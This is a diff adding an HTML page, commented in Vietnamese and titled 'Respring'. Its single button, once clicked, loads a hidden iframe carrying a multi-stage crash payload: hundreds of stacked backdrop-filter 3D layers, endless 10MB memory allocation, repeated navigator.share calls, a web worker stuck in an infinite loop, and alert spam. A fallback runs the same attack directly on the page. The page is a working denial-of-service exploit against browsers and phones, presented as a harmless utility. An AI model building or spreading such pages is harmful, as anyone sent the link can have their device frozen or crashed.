@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Respring</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            display: block;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.1); opacity: 1; }
+        }
+
+        .title {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 300;
+            letter-spacing: 4px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            font-weight: 300;
+            letter-spacing: 2px;
+            margin-bottom: 50px;
+        }
+
+        .btn-respring {
+            background: linear-gradient(135deg, #ff0033, #cc0022);
+            border: none;
+            border-radius: 60px;
+            padding: 20px 60px;
+            font-size: 26px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 0 40px rgba(255, 0, 51, 0.3);
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn-respring::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 60%);
+            animation: shine 3s infinite linear;
+        }
+
+        @keyframes shine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-respring:active {
+            transform: scale(0.95);
+            box-shadow: 0 0 60px rgba(255, 0, 51, 0.6);
+        }
+
+        .btn-respring:active::before {
+            animation-duration: 0.5s;
+        }
+
+        .footer {
+            margin-top: 60px;
+            color: #333;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        .footer span {
+            color: #ff0033;
+        }
+
+        /* Hiệu ứng loading sau khi bấm */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+
+        .overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #222;
+            border-top: 4px solid #ff0033;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-text {
+            color: #888;
+            font-size: 16px;
+            margin-top: 30px;
+            letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <span class="icon">⚡</span>
+        <h1 class="title">Respring</h1>
+        <p class="subtitle">bấm một cái — máy bay liền</p>
+
+        <button class="btn-respring" id="respringBtn">▶ Respring</button>
+
+        <p class="footer">made by <span>seraph</span> · use at your own risk</p>
+    </div>
+
+    <!-- Overlay loading -->
+    <div class="overlay" id="overlay">
+        <div class="spinner"></div>
+        <p class="overlay-text">đang xử lý...</p>
+    </div>
+
+    <script>
+        document.getElementById('respringBtn').addEventListener('click', function(e) {
+            // Chặn click nhiều lần
+            this.disabled = true;
+            this.style.opacity = '0.5';
+
+            // Hiển thị overlay loading
+            document.getElementById('overlay').classList.add('active');
+
+            // Dùng requestAnimationFrame để đảm bảo UI kịp render
+            requestAnimationFrame(() => {
+                // Kỹ thuật respring - bản nâng cấp từ code gốc
+                try {
+                    // Tạo iframe ẩn chạy script
+                    const frame = document.createElement('iframe');
+                    frame.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;border:none;opacity:0.01;pointer-events:none;';
+                    frame.sandbox = 'allow-scripts allow-same-origin allow-modals';
+                    document.body.appendChild(frame);
+
+                    const payload = `
+                        <html>
+                        <body style="margin:0;overflow:hidden;">
+                            <script>
+                                // Tầng 1: backdrop-filter 3D
+                                const container = document.createElement('div');
+                                container.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%;';
+                                document.body.appendChild(container);
+                                for (let i = 0; i < 500; i++) {
+                                    let d = document.createElement('div');
+                                    d.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
+                                    container.appendChild(d);
+                                }
+
+                                // Tầng 2: vòng lặp bộ nhớ
+                                let arr = [];
+                                let counter = 0;
+                                function eatMemory() {
+                                    try {
+                                        let chunk = new Uint8Array(1024 * 1024 * 10); // 10MB mỗi lần
+                                        crypto.getRandomValues(chunk);
+                                        arr.push(chunk);
+                                        counter++;
+                                        // Spam navigator.share nếu có
+                                        if (navigator.share) {
+                                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
+                                        }
+                                    } catch(e) {}
+                                    // Gọi lại liên tục không nghỉ
+                                    requestAnimationFrame(eatMemory);
+                                }
+                                eatMemory();
+
+                                // Tầng 3: đẩy CPU bằng web worker
+                                try {
+                                    const workerCode = 'postMessage(0); while(true){};';
+                                    const blob = new Blob([workerCode], {type:'application/javascript'});
+                                    const worker = new Worker(URL.createObjectURL(blob));
+                                } catch(e) {}
+
+                                // Tầng 4: lấp đầy lịch trình
+                                setInterval(() => {
+                                    for (let i = 0; i < 1000; i++) {
+                                        document.createElement('div');
+                                    }
+                                }, 0);
+
+                                // Bắn alert spam (nếu cho phép)
+                                setTimeout(() => {
+                                    for (let i = 0; i < 50; i++) {
+                                        setTimeout(() => { alert('Respring!'); }, i * 50);
+                                    }
+                                }, 100);
+                            <\/script>
+                        </body>
+                        </html>
+                    `;
+
+                    frame.srcdoc = payload;
+
+                } catch(e) {
+                    // Fallback: nếu iframe fail, vẫn dùng script trực tiếp
+                    const container = document.createElement('div');
+                    container.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;perspective:1px;perspective-origin:9999999% 9999999%;z-index:99999;pointer-events:none;';
+                    document.body.appendChild(container);
+                    for (let i = 0; i < 500; i++) {
+                        let d = document.createElement('div');
+                        d.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
+                        container.appendChild(d);
+                    }
+                    let arr = [];
+                    setInterval(() => {
+                        let chunk = new Uint8Array(1024 * 1024 * 10);
+                        crypto.getRandomValues(chunk);
+                        arr.push(chunk);
+                        if (navigator.share) {
+                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
+                        }
+                    }, 0);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
